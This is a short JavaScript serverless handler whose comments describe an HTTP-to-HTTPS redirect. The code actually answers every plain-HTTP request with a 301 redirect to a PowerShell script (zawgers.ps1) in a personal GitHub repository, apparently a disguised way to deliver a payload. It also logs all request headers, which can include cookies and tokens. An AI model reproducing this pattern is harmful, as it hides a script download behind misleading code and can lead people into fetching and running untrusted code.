// api/redirect.js

export default function handler(req, res) {
  // Log the request headers for debugging
  console.log('Request Headers:', req.headers);

  // Detect the protocol using the 'x-forwarded-proto' header
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  
  // Log the detected protocol for debugging
  console.log('Detected Protocol:', protocol);

  // If the protocol is HTTP, redirect with a 301 status code
  if (protocol === 'http') {
    console.log('Redirecting HTTP request to HTTPS with a 301 status code');
    res.redirect(301, 'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1');
  } else {
    // Log the incoming request URL for debugging
    console.log('Request is already HTTPS, processing normally');

    // Respond with a simple message (or perform another action if needed)
    res.status(200).send('Request processed successfully');
  }
}
